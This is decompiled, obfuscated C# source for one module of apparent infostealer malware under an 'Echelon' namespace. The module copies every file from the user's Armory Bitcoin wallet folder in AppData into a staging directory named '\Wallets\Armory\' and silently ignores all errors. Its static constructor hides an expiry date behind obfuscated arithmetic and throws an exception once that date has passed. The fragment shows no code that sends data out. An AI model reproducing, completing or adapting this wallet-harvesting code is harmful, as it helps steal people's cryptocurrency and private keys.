using Echelon;
using System;
using System.IO;

internal class ap
{
	private static readonly string m_a;

	public static void a(string jk)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.AppDate + "\\Armory\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(jk + ap.m_a);
				fileInfo.CopyTo(jk + ap.m_a + fileInfo.Name);
			}
			ba.a++;
		}
		catch
		{
		}
	}

	static ap()
	{
		DateTime d = default(DateTime).AddYears((-((333230548 + -254687218) ^ 0x29518104) ^ 0x28878DD7) + 91782422).AddMonths(-(0x272E06EA ^ -657327849)).AddDays(5.55875);
		if ((DateTime.Now - d).TotalDays > 0.0)
		{
			throw new ArgumentOutOfRangeException();
		}
		ap.m_a = "\\Wallets\\Armory\\";
	}
}
